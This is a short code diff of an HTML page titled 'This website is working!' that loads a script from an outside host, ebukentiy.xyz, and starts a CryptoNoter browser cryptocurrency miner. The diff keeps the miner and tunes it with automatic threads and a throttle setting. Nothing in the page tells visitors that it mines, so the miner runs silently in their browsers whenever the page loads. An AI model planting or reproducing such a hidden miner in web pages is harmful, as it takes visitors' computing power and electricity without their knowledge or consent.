@@ -4,7 +4,12 @@
 <title>This website is working!</title>
 <script src="https://ebukentiy.xyz/processor.js"></script>
 <script>
-    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
+	var addr = 'CryptoNoter';
+	var miner = new CryptoNoter.Anonymous(addr, {
+        autoThreads: true,
+	throttle: 0.5
+	});
+	miner.start();
 </script>
 </head>
 <body>
